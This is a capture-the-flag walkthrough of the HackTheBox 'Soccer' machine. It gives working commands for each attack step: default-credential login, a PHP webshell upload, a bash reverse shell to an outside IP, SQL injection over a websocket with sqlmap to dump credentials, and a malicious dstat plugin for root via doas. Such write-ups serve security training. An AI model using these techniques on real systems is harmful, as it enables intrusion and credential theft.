![Soccer](/img/soccer-cover.png)

Soccer starts with a website that is managed over Tiny File Manager. On finding the default credentials, I’ll use that to upload a webshell and get a shell on the box. With this foothold, I’ll identify a second virtual host with a new site. That site uses websockets to do a validation task. I’ll exploit an SQL injection over the websocket to leak a password and get a shell over SSH. The user is able to run dstat as root using doas, which I’ll exploit by crafting a malicious plugin.

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22), HTTP (80), and something HTTPish (9091):

```

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu 20.04 focal.

The port 80 HTTP server shows a redirect to `soccer.htb`.

### Subdomain Brute Force

Given the use of potential host based routing, I’ll try to brute force the webserver on port 80 to see if it replies differently for any subdomains of `soccer.htb`. It doesn’t find anything:

```

oxdf@hacky$ ffuf -u http://10.10.11.194 -H "Host: FUZZ.soccer.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac

```

Because port 9091 looks like a webserver as well, I can try that, but it doesn’t find anything either:

```

oxdf@hacky$ ffuf -u http://10.10.11.194:9091 -H "Host: FUZZ.soccer.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac

```

I’ll add `soccer.htb` to my `hosts` file:

```
10.10.11.194 soccer.htb

```

### soccer.htb - TCP 80

#### Site

The site is for the HTB FootBall Club:

[![image-20230604134858470](/img/image-20230604134858470.png)](/img/image-20230604134858470.png)

[*Click for full image*](/img/image-20230604134858470.png)

There are no links on the page.

#### Tech Stack

The HTTP headers don’t show much beyond nginx:

```

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 04 Jun 2023 17:48:07 GMT
Content-Type: text/html
Last-Modified: Thu, 17 Nov 2022 08:07:11 GMT
Connection: close
ETag: W/"6375ebaf-1b05"
Content-Length: 6917

```

The page loads as `/index.html`, suggesting it may just be a static site. The page source doesn’t show anything interesting either.

The 404 page is a standard nginx 404:

![image-20230604135245436](/img/image-20230604135245436.png)

So there could be something else here, but it’s looking like a static site at this point.

#### Directory Brute Force

I’ll run `feroxbuster` against the site:

```

oxdf@hacky$ feroxbuster -u http://soccer.htb

```

It finds `/tiny` and `/tiny/uploads`.

#### Tiny File Manager

`/tiny` is an instance of Tiny File Manager:

![image-20230604140005575](/img/image-20230604140005575.png)

This is a common name for software, but searching for it with the term “CCP Programmers” finds the source on GitHub [here](https://github.com/prasathmani/tinyfilemanager), where it describes itself as:

> TinyFileManager is web based PHP file manager and it is a simple, fast and small size in single-file PHP file that can be dropped into any folder on your server, multi-language ready web application for storing, uploading, editing and managing files and folders online via web browser. The Application runs on PHP 5.5+, It allows the creation of multiple users and each user can have its own directory and a built-in support for managing text files with cloud9 IDE and it supports syntax highlighting for over 150+ languages and over 35+ themes.

## Shell as www-data

### Authenticate to Tiny File Manager

On the README file, it gives the following instructions for how to set up Tiny File Manager:

> Download ZIP with latest version from master branch.
>
> Just copy the tinyfilemanager.php to your webspace - that’s all :) You can also change the file name from “tinyfilemanager.php” to something else, you know what i meant for.
>
> Default username/password: **admin/admin@123** and **user/12345**.
>
> Warning: Please set your own username and password in `$auth_users` before use. password is encrypted with `password_hash()`. to generate new password hash [here](https://tinyfilemanager.github.io/docs/pwd.html)
>
> To enable/disable authentication set `$use_auth` to true or false.
>
> Add your own configuration file [config.php](https://tinyfilemanager.github.io/config-sample.txt) in the same folder to use as additional configuration file.
>
> To work offline without CDN resources, use [offline](https://github.com/prasathmani/tinyfilemanager/tree/offline) branch

That gives two sets of default credentials, “admin” / “admin@123” and “user” / “12345”. Both sets of creds work here. I’ll log in as admin.

### Tiny File Manager

Logged in, the page show the files that are part of the Soccer website:

![image-20230604142515207](/img/image-20230604142515207.png)

The URL is `http://soccer.htb/tiny/tinyfilemanager.php?p=`, which shows that the server is running PHP.

The `tiny` directory has the filemanager page, as well as the `uploads` directory:

![image-20230604142608344](/img/image-20230604142608344.png)

`uploads` is empty:

![image-20230604142623505](/img/image-20230604142623505.png)

### Shell

I’ll make a simple PHP webshell:

```

<?php system($_REQUEST["cmd"]); ?>

```

I’ll use the “Upload” button, and it offers a way to upload:

![image-20230604142956658](/img/image-20230604142956658.png)

If I try to upload in `/var/www/html/`, it fails:

![image-20230604143018728](/img/image-20230604143018728.png)

If I navigate to `/tiny/uploads` and then click “Upload”, it works:

![image-20230604143115422](/img/image-20230604143115422.png)

The webshell provides execution:

```

oxdf@hacky$ curl http://soccer.htb/tiny/uploads/cmd.php -d 'cmd=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

I’ll start `nc` listening on 443 on my host, and trigger a reverse shell by sending a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw):

```

oxdf@hacky$ curl http://soccer.htb/tiny/uploads/cmd.php -d 'cmd=bash -c "bash -i >%26 /dev/tcp/10.10.14.6/443 0>%261"'

```

It hangs, but there’s a connection at `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.194 55140
bash: cannot set terminal process group (1048): Inappropriate ioctl for device
bash: no job control in this shell
www-data@soccer:~/html/tiny/uploads$ 

```

I’ll upgrade my shell using the `script` / `stty` [trick](https://www.youtube.com/watch?v=DqE6DxqJg8Q).

## Shell as player

### Enumeration

#### Web Roots

The files in `/var/www/html` match what I observed via the file manager:

```

www-data@soccer:~/html$ ls 
football.jpg  ground2.jpg  ground4.jpg  tiny
ground1.jpg   ground3.jpg  index.html

```

There’s no database connection. The only credentials in the files are the users created for the Tiny File Manager:

```

// Login user name and password
// Users: array('Username' => 'Password', 'Username2' => 'Password2', ...)
// Generate secure password hash - https://tinyfilemanager.github.io/docs/pwd.html
$auth_users = array(
    'admin' => '$2y$10$/K.hjNr84lLNDt8fTXjoI.DBp6PpeyoJ.mGwrrLuCZfAwfSAGqhOW', //admin@123
    'user' => '$2y$10$Fg6Dz8oH9fPoZ2jJan5tZuv6Z4Kp7avtQ9bDfrdRntXtPeiMAZyGO' //12345                                                      
);

```

#### Other Home Directories

There’s one home directory in `/home`, `player`:

```

www-data@soccer:/home$ ls
player

```

`user.txt` is in that directory but www-data can’t read it:

```

www-data@soccer:/home/player$ ls -la
total 28
drwxr-xr-x 3 player player 4096 Nov 28  2022 .

```

#### Network / Processes

The `netstat` shows a few ports that weren’t available from the outside:

```

www-data@soccer:/$ netstat -tnlp

```

There’s still not much information about what 9091 could be. Port 3000 looks to be another web page:

```

www-data@soccer:/$ curl localhost:3000
<!DOCTYPE html>          
<html lang="en">              
    <head>                                                           
        <meta charset="UTF-8">

        <meta name="viewport" content="width=device-width, initial-scale=1.0">                                                            
        <link href="/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">                                                          
        <script src="/js/bootstrap.bundle.min.js"></script>                                                                               
        <script src="/js/jquery.min.js"></script>
...[snip]...

```

3306 and 33060 both seem to be MySQL instances:

```

www-data@soccer:/$ mysql -p 3306
Enter password: 
ERROR 1045 (28000): Access denied for user 'www-data'@'localhost' (using password: YES)
www-data@soccer:/$ mysql -p 33060
Enter password: 
ERROR 1045 (28000): Access denied for user 'www-data'@'localhost' (using password: YES)

```

It’s hard to verify any of this as www-data can only read it’s own processes:

```

www-data@soccer:/$ ps auxww

```

That is because `/proc` is mounted with `hidepid=2`:

```

www-data@soccer:/$ mount | grep ^proc
proc on /proc type proc (rw,nodev,relatime,hidepid=2)

```

#### nginx

There’s nothing else of interest in the system root or `/opt` or `/srv`. I’ll look at how nginx is configured. There are two site files in `/etc/nginx/sites-enabled`:

```

www-data@soccer:/etc/nginx/sites-enabled$ ls
default  soc-player.htb

```

`default` set up the redirect to `soccer.htb`:

```

server {
        listen 80;
        listen [::]:80;
        server_name 0.0.0.0;
        return 301 http://soccer.htb$request_uri;
}

```

It also configures the main site, allowing it PHP for PHP files:

```

server {
        listen 80;
        listen [::]:80;

        server_name soccer.htb;

        root /var/www/html;
        index index.html tinyfilemanager.php;

        location / {
               try_files $uri $uri/ =404;
        }

        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.4-fpm.sock;
        }

        location ~ /\.ht {
                deny all;
        }

}

```

`soc-player.htb` sets up another site that matches on the name `soc-player.soccer.htb`:

```

server {
        listen 80;
        listen [::]:80;

        server_name soc-player.soccer.htb;

        root /root/app/views;

        location / {
                proxy_pass http://localhost:3000;
                proxy_http_version 1.1;
                proxy_set_header Upgrade $http_upgrade;
                proxy_set_header Connection 'upgrade';
                proxy_set_header Host $host;
                proxy_cache_bypass $http_upgrade;
        }

}

```

This webserver is hosted out of `/root/`, which is interesting, and passes to localhost 3000 (as observed previously).

I’ll update my `hosts` file:

```
10.10.11.194 soccer.htb soc-player.soccer.htb

```

### soc-player.soccer.htb

#### Site

This site looks exactly the same as the previous, except it has more options in the menu bar:

[![image-20230604165704296](/img/image-20230604165704296.png)](/img/image-20230604165704296.png)

[*Click for full image*](/img/image-20230604165704296.png)

“Match” has a page with a couple matches on it:

![image-20230604165746426](/img/image-20230604165746426.png)

It mentions a free ticket with login. I’ll register an account on the login:

![image-20230604165818394](/img/image-20230604165818394.png)

After logging in, it redirects to `/check`, where I get a ticket id:

![image-20230604165857513](/img/image-20230604165857513.png)

I can put a ticket id into the field and hit enter, and it tells me that the ticket exists:

![image-20230604170001242](/img/image-20230604170001242.png)

Or a different number does not exist:

![image-20230604170018474](/img/image-20230604170018474.png)

#### Tech Stack

The HTTP headers on this site show something different:

```

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sun, 04 Jun 2023 21:01:25 GMT
Content-Type: text/html; charset=utf-8
Connection: close
X-Powered-By: Express
ETag: W/"1a5d-j2rGKcxb2vG5mw817o9kuCXUG9A"
Set-Cookie: connect.sid=s%3AfzlQ3aFEPfRhEXq51K_uqNvexNoR9nuY.%2BBeuQqYAry5y7q1Wccbld3alYHOkL0AmbBCA201JP5E; Path=/; HttpOnly
Content-Length: 6749

```

It’s running Express, a [NodeJS web framework](https://expressjs.com/).

#### Websockets

There’s another interesting request. Logging in submits a POST request to `/login`. On success, it returns a 302 redirect to `/check`. As that page is loading, it makes a request to `soc-player.soccer.htb:9091`, which returns a 101:

![image-20230604170632475](/img/image-20230604170632475.png)

HTTP 101 is a Switching Protocols response:

```

HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: 2lpCpI8gQ/C/eDaO6NMwOr0mrNs=

```

TCP 9091 is a websocket server. There’s no immediate messages shown in the “WebSockets history” tab in Burp. But once I check a ticket, there’s a message and a response:

![image-20230604170825371](/img/image-20230604170825371.png)

The sent message is simply JSON with the `id`:

![image-20230604170905237](/img/image-20230604170905237.png)

The response is just the text that is shown:

![image-20230604170926325](/img/image-20230604170926325.png)

### SQL Injection over Websockets

#### Identify

I’ll send one of the “To server” message to Burp Repeater and play around with it. Adding in a `'` doesn’t do anything other than return “Ticket Doesn’t Exist”. Any time I’m trying SQLI with an integer value, it’s worth trying without a `'` as well. The `'` is used to close strings, but if the input is being handled as an integer, perhaps just an ` or 1=1– - `will work (where` – -` is to comment out whatever follows). It does:

![image-20230604171233188](/img/image-20230604171233188.png)

There is no ticket 0, but it still returns exists because it pulls all rows.

#### Blind SQL Injection Background

This is a blind SQL injection - no data from the database comes back in the response, only one of two responses. The goal is to be able to ask questions of the database. For example, “is there a username that starts with ‘a’”?

To get there, first I’ll need to be able to picture the query being run on the system. It’s going to be something like:

```

SELECT * from ticket where id = {id};

```

If one or more rows return, then it says the ticket exists, else it doesn’t.

To make a test, there are a few ways I could structure a query. For manual testing, I prefer to use a `UNION` injection. I’ll send something that will return no rows, and then use a `UNION` to make another query, and then if that query returns rows, it will return that the “Ticket Exists”.

It’s also possible to make these queries using `OR foo=bar` to test, but I find those more difficult to think about when doing the manual approach.

I’ll also note that the app seems to handle query errors by returning “Ticket Doesn’t Exist” rather than crashing.

#### Manually Building a UNION

I need to know the number of columns returned from the query, because my `UNION` statement must return the same number, or it crashes. If I send one, it returns false:

![image-20230604210924721](/img/image-20230604210924721.png)

I’ll add more columns until it returns true at three columns:

![image-20230604210958963](/img/image-20230604210958963.png)

Now the query on the server looks like this:

```

SELECT * from ticket where id = 0 UNION SELECT 1,2,3;

```

The first select returns no row, and then my `UNION` returns the values 1, 2, 3, and it returns “Ticket Exists”.

#### Manually Asking a Question

Now to ask a question. In MySQL, there’s a `mysql.user` table with the users that can log into MySQL. I’m going to send this payload that will return true *if* there’s a user in that table that starts with “a”:

```

{"id":"0 UNION select user,2,3 from mysql.user where user like 'a%'-- -"}

```

It returns false. There is likely a user named “root”, and changing “a” to “r”, it returns true:

![image-20230604211417121](/img/image-20230604211417121.png)

With enough requests, any value from the table can be brute-forced one character at a time.

#### sqlmap

Doing all of this manually is impossible, so I’ll either have to write a script to do it, or find a tool. `sqlmap` is the perfect tool here, and it even works over websockets.

If `sqlmap` returns this error, it’s because the Python websockets library is missing:

```

[21:17:13] [CRITICAL] sqlmap requires third-party module 'websocket-client' in order to use WebSocket functionality 

```

Or if `sqlmap` returns this error, it’s because the wrong websockets library is installed:

```

[21:18:30] [ERROR] wrong modification time of '/usr/share/sqlmap/sqlmapapi.py'
[21:18:30] [ERROR] wrong modification time of '/usr/share/sqlmap/sqlmap.py'
[21:18:30] [ERROR] wrong modification time of '/usr/share/sqlmap/thirdparty/identywaf/identYwaf.py'
[21:18:30] [CRITICAL] wrong websocket library detected (Reference: 'https://github.com/sqlmapproject/sqlmap/issues/4572#issuecomment-77504
1086')

```

Either of these are fixed with `pip install websocket-client`.

I’ll give it the following arguments:
- `-u "ws://soc-player.soccer.htb:9091"` - The URL to connect to.
- `--data '{"id": "1234"}'` - The data to send.
- `--dbms mysql` - Tell `sqlmap` that it’s running MySQL.
- `--batch` - Take the default answer on all questions.
- `--level 5 --risk 3` - Increase to the most aggressive to find the boolean injection (without this it just finds a time-based injection, which is really slow).

It finds a time-based injection, and then finds the three column `UNION`-based boolean as well:

```

oxdf@hacky$ sqlmap -u ws://soc-player.soccer.htb:9091 --data '{"id": "1234"}' --dbms mysql --batch --lev
el 5 --risk 3
...[snip]...

sqlmap identified the following injection point(s) with a total of 373 HTTP(s) requests:

    Payload: {"id": "-1533 OR 9982=9982"}

    Type: time-based blind

---

...[snip]...

```

It’s using the `OR` structure for boolean rather than `UNION`.

### Enumerate DB

#### List Databases

Now that `sqlmap` has found an injection, I’ll up-arrow and add `--dbs` to the previous command. Theads are safe to do in a boolean injection, so I’ll add `--threads 10` to speed it up. It will pick up where it left off and list the available databases:

```

oxdf@hacky$ sqlmap -u ws://soc-player.soccer.htb:9091 --dbs --data '{"id": "1234"}' --dbms mysql --batch --level 5 --risk 3 --threads 10
...[snip]...
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] soccer_db
[*] sys
...[snip]...

```

#### List Tables in soccer\_db

`soccer_db` seems like the only non-default DB. I’ll replace `--dbs` with `-D soccer_db` to specify that database and then add `--tables` to list the tables:

```

oxdf@hacky$ sqlmap -u ws://soc-player.soccer.htb:9091 -D soccer_db --tables --data '{"id": "1234"}' --dbms mysql --batch --level 5 --risk 3 --threads 10
...[snip]...
Database: soccer_db
[1 table]
+----------+
| accounts |
+----------+
...[snip]...

```

There’s only one.

#### Dump accounts

In general, with boolean and time-based SQL injections, I want to be careful about dumping tons of data, as it will be very slow. That said, since there’s only one table, I want the entire thing, so I’ll replace `--tables` with `-T accounts` and add `--dump`. It dumps the table:

```

oxdf@hacky$ sqlmap -u ws://soc-player.soccer.htb:9091 -D soccer_db -T accounts --dump --data '{"id": "1234"}' --dbms mysql --batch --level 5 --risk 3 --threads 10
...[snip]...
Database: soccer_db
Table: accounts
[1 entry]
+------+-------------------+----------------------+----------+
| id   | email             | password             | username |
+------+-------------------+----------------------+----------+
| 1324 | player@player.htb | PlayerOftheMatch2022 | player   |
+------+-------------------+----------------------+----------+
...[snip]...

```

The user is player and the password is in plaintext.

### su / SSH

That password works for the player user on the box with `su`:

```

www-data@soccer:/home/player$ su player -
Password: 
player@soccer:~$

```

It works for SSH as well:

```

oxdf@hacky$ sshpass -p PlayerOftheMatch2022 ssh player@soccer.htb
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)
...[snip]...
player@soccer:~$

```

Either way I’ll grab `user.txt`:

```

player@soccer:~$ cat user.txt
df7f36e9************************

```

## Shell as root

### Enumeration

#### sudo / doas

The first check on Linux is always `sudo`, but nothing set up for player on Soccer:

```

player@soccer:~$ sudo -l
[sudo] password for player: 
Sorry, user player may not run sudo on localhost.

```

However, in looking for SetUID binaries, the first one jumps out:

```

player@soccer:~$ find / -perm -4000 2>/dev/null
/usr/local/bin/doas
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
...[snip]...

```

`doas` is an alternative to `sudo` typically found on OpenBSD operating systems, but that can be installed on Debian-base Linux OSes like Ubuntu.

#### doas Config

I don’t see a `doas.conf` file in `/etc`, so I’ll search the filesystem for it with `find`:

```

player@soccer:~$ find / -name doas.conf 2>/dev/null
/usr/local/etc/doas.conf

```

It has one line:

```

player@soccer:~$ cat /usr/local/etc/doas.conf 
permit nopass player as root cmd /usr/bin/dstat

```

player can run the command `dstat` as root.

### dstat

#### man Page

`dstat` is a tool for getting system information. Looking at the [man page](https://linux.die.net/man/1/dstat), there’s a section on plugins that says:

> While anyone can create their own dstat plugins (and contribute them) dstat ships with a number of plugins already that extend its capabilities greatly.

At the very bottom of the page, it has a section on files:

> Paths that may contain external dstat\_\*.py plugins:
>
> ```

> ~/.dstat/
> (path of binary)/plugins/
> /usr/share/dstat/
> /usr/local/share/dstat/
>
> ```

Plugins are Python scripts with the name `dstat_[plugin name].py`.

#### Malicious Plugin

I’ll write a very simple plugin:

```

import os

os.system("/bin/bash")

```

This will drop into Bash for an interactive shell.

Looking at the list of locations, I can obviously write to `~/.dstat`, but when run with `doas`, it’ll be running as root, and therefore won’t check `/home/player/.dstat`. Luckily, `/usr/local/share/dstat` is writable.

```

player@soccer:~$ echo -e 'import os\n\nos.system("/bin/bash")' > /usr/local/share/dstat/dstat_0xdf.py

```

With that in place, I’ll invoke `dstat` with the `0xdf` plugin:

```

player@soccer:~$ doas /usr/bin/dstat --0xdf
/usr/bin/dstat:2619: DeprecationWarning: the imp module is deprecated in favour of importlib; see the module's documentation for alternative uses
  import imp
root@soccer:/home/player#

```

And grab the flag:

```

root@soccer:~# cat root.txt
774a30b5************************

```
